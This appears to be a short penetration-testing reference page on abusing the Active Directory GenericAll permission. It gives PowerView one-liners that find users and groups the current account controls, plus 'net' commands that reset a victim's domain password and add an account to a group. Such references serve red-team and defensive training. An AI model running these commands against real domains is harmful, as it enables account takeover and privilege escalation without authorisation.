# Abuse GenericAll

Find domain users that current user has `GenericAll` access right to:

```
PowerView3 > Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} ? {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

![](<../../../../.gitbook/assets/image (270).png>)

The attacker can change password of discovered users:

```
Cmd > net user snovvcrash Passw0rd! /domain
```

Find domain groups that current user has `GenericAll` access right to:

```
PowerView3 > Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} ? {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

The attacker can add users to discovered groups:

```
Cmd > net group "IT Desk" snovvcrash /add /domain
```
